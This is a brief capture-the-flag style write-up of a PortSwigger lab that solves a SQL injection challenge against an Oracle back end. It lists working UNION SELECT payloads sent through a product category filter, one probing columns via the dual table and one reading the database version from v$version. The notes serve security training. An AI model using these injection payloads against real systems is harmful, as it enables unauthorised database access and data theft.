
# #PortSwigger 


![[Pasted image 20251212194344.png]]


## Lab Description

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

**Objective:** Display the database version string.

**Hint:** Oracle databases require every SELECT statement to specify a table using the `FROM` keyword. Use the built-in `dual` table for dummy queries.

---
---

### Step 1: Capture the Category Filter Request

1. In Burp's browser, access the lab
2. Click on a product category filter (e.g., "Gifts")
3. In Burp Proxy, find the request

**Example request:**
```
GET /filter?category=Gifts HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```


---

### Step 2: Determine Number of Columns

**Test with `UNION SELECT FROM dual`:**
```
GET /filter?category=' UNION SELECT 'abc','xyz' FROM dual-- HTTP/1.1
```

**Response:**
![[Pasted image 20251212194434.png]]


---

### Step 3: Retrieve Database Version

**Payload (Oracle uses `v$version`):**
```
GET /filter?category=' UNION SELECT BANNER, NULL FROM v$version-- HTTP/1.1
```

**Response:**
![[Pasted image 20251212194613.png]]

**The version string is displayed in the response.**

---

### Step 4: Lab Solved

![[Pasted image 20251212194839.png]]


---
---


